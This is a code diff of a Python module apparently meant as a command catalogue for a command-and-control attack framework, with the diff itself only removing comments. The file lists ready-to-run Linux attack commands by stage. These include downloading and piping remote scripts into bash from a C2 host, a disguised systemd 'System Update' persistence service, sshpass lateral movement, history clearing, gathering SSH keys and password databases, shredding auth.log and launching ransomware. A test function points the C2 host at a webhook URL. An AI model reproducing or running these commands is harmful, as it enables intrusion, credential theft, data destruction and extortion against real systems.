@@ -3,7 +3,6 @@ Defines all command categories and their OS-specific implementations
 """
 import time
 
-# checking security of operations before initialization
 opsec_check_commands = {
     "linux": [
         {"cmd": "ps -ef | grep -E 'wireshark|tcpdump|tshark|snort|suricata'", "type": "monitoring_check", "timestamp": time.time()},
@@ -15,7 +14,6 @@ opsec_check_commands = {
     ],
 }
 
-# Initial access commands
 initial_access_commands = {
     "linux": [
         {"cmd": "curl -s http://C2_IP/m.sh | bash -s || wget -q -O- http://C2_IP/m.sh | bash -s", "type": "fileless", "timestamp": time.time()},
@@ -29,7 +27,6 @@ initial_access_commands = {
     ],
 }
 
-# Add network validation commands
 network_validation_commands = {
     "linux": [
         {"cmd": "curl -s -m 3 -o /dev/null -w '%{http_code}' https://www.google.com || echo 'offline'", "type": "connectivity", "timestamp": time.time()},
@@ -41,7 +38,6 @@ network_validation_commands = {
     ],
 }
 
-# Recon commands
 recon_commands = {
     "linux": [
         {"cmd": "whoami && id && hostname", "type": "user_info", "timestamp": time.time()},
@@ -61,7 +57,6 @@ recon_commands = {
     ],
 }
 
-# Privilege escalation commands
 privilege_escalation_commands = {
     "linux": [
         {"cmd": "find / -type f -name \"*.so\" -perm -u=s -ls 2>/dev/null", "type": "suid_check", "timestamp": time.time()},
@@ -79,7 +74,6 @@ privilege_escalation_commands = {
     ],
 }
 
-# Persistence commands
 persistence_commands = {
     "linux": [
         {"cmd": "mkdir -p ~/.config/systemd/user && echo -e '[Unit]\\nDescription=System Update\\n\\n[Service]\\nExecStart=/bin/bash -c \"curl -s http://C2_IP/update | bash\"\\n\\n[Install]\\nWantedBy=default.target' > ~/.config/systemd/user/update.service && systemctl --user enable update.service", "type": "systemd_user", "timestamp": time.time()},
@@ -95,7 +89,6 @@ persistence_commands = {
     ],
 }
 
-# Lateral movement commands
 lateral_movement_commands = {
     "linux": [
         {"cmd": "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@TARGET_IP 'curl http://C2_IP/malware | bash'", "type": "ssh", "timestamp": time.time()},
@@ -107,7 +100,6 @@ lateral_movement_commands = {
     ],
 }
 
-# Defense evasion commands
 defense_evasion_commands = {
     "linux": [
         {"cmd": "unset HISTFILE && export HISTFILESIZE=0 && history -c", "type": "history_clean", "timestamp": time.time()},
@@ -125,7 +117,6 @@ defense_evasion_commands = {
     ],
 }
 
-# Exfiltration commands
 xfiltration_commands = {
     "linux": [
         {"cmd": "find /home -name \"*.kdbx\" -o -name \"id_rsa\" -o -name \"*.pdf\" -o -name \"*.docx\" | xargs -I{} tar -rf /tmp/data.tar \"{}\" 2>/dev/null", "type": "gather", "timestamp": time.time()},
@@ -143,7 +134,6 @@ xfiltration_commands = {
     ],
 }
 
-# Cleanup commands
 cleanup_commands = {
     "linux": [
         {"cmd": "shred -zu /var/log/auth.log", "type": "log_wipe", "timestamp": time.time()},
@@ -155,7 +145,6 @@ cleanup_commands = {
     ],
 }
 
-# Payload commands
 payload_commands = {
     "linux": [
         {"cmd": "./malware --encrypt --key ATTACKER_KEY", "type": "ransomware", "timestamp": time.time()},
@@ -214,7 +203,6 @@ exfiltration_commands = {
 
 
 
-# Command execution order
 ORDER = [
     opsec_check_commands,
     initial_access_commands,
@@ -231,25 +219,21 @@ ORDER = [
 
 
 def test_c2_framework():
-    # Get a webhook URL from webhook.site for testing
     WEBHOOK_URL = "https://webhook.site/dbb2f74a-8a11-4636-aba4-9d4626317974"
     
-    # Create parameters dictionary
     params = {
         'C2_IP': WEBHOOK_URL,
-        'TARGET_IP': '127.0.0.1',  # Local testing only
+        'TARGET_IP': '127.0.0.1',  
         'ATTACKER_PUB_KEY': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3...',
         'WALLET_ADDRESS': '44AFFq5kSiGBoZ...',
         'ATTACKER_KEY': 'test_key_123'
     }
     
-    # Get the commands with replaced parameters
     commands = get_commands_for_os('linux', params)
     
-    # Print the first few commands from each category
     for category_idx, category in enumerate(commands):
         print(f"Command Category {category_idx + 1}:")
-        for cmd in category[:2]:  # Show first 2 commands from each category
+        for cmd in category[:2]: 
             print(f"  - {cmd['cmd']}")
         print()
 
@@ -260,7 +244,6 @@ def get_commands_for_os(os_type, c2_server="C2_IP", payload_dir="/tmp", agent_id
     """
     Returns a list of commands with customized parameters
     """
-    # Replace placeholders in commands
     commands = []
     for cmd_group in ORDER:
         os_cmds = []
